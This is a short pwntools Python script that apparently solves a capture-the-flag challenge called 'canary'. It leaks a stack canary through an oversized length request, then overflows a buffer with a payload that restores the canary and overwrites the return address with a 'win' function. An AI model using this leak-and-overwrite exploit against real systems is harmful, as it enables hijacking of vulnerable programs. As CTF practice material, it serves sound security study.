from pwn import *

# p = process("./canary")
# gdb.attach(p)

p = remote("forever.isss.io", 1308)

p.recvuntil(b"What is the length of your answer?")
p.sendline(b"112")

p.recvuntil(b"answer")
p.sendline(b"no")

p.recvuntil(b"is:")
p.recvline()
canary = u64(p.recvline()[-9:].strip().ljust(8, b"\x00"))
log.success(f"{hex(canary)=}")

win = 0x40133b

payload = b"A"*0x68 + p64(canary) + b"B"*8 + p64(win)

p.recvuntil(b"second try")
p.sendline(payload)

p.interactive()